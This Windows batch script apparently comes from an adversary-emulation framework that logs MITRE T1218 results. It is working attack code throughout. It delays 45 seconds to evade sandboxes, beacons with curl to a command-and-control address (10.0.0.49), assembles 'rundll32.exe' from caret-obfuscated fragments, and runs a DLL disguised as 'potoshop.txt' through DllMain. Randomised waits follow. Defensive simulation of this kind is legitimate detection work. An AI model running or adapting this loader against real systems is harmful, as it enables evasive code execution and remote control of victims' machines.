@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8262\b270bed4
SET fpakbq=Macula-Stage0-8262
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8262-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=potoshop.txt
SET fpldhe=8262

REM Log file path
SET logfile=%APPDATA%\!yydue!\macula-simulations.log

REM Initial delay to evade sandbox analysis
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete>> "!logfile!" 2>nul

REM Heartbeat to C2 - FIRST OPERATION AS REQUESTED
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_complete>> "!logfile!" 2>nul

ping -n 12 127.0.0.1 >nul

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_start target=!yktnwwf!>> "!logfile!" 2>nul
cd /d "!yktnwwf!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_complete result=%ERRORLEVEL%>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul

REM Build obfuscated LOLBin command for T1218
SET cmd1=r^u^n
SET cmd2=d^l^l^3
SET cmd3=2^.^e^x
SET cmd4=e
SET fullcmd=%WINDIR%\System32\!cmd1!!cmd2!!cmd3!!cmd4!

REM Obfuscated DLL call with fragments
SET arg1=!edjwtl!
SET arg2=,^ D^l^lM^a^i^n

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: process_start lolbin=rundll32.exe>> "!logfile!" 2>nul

SET result=1
SET err_detail=
CALL "!fullcmd!" "!arg1!!arg2!" 2>nul
IF NOT !ERRORLEVEL! EQU 0 (
    SET result=0
    SET err_detail=process_failed
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: process_complete result=!ERRORLEVEL!>> "!logfile!" 2>nul

REM Random delay
SET /A delay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start seconds=!delay!>> "!logfile!" 2>nul
timeout /t !delay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete>> "!logfile!" 2>nul

REM Build timestamp for TTP log
set timestamp=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!

REM TTP logging for T1218
echo [!timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!logfile!" 2>nul

ping -n 5 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_complete>> "!logfile!" 2>nul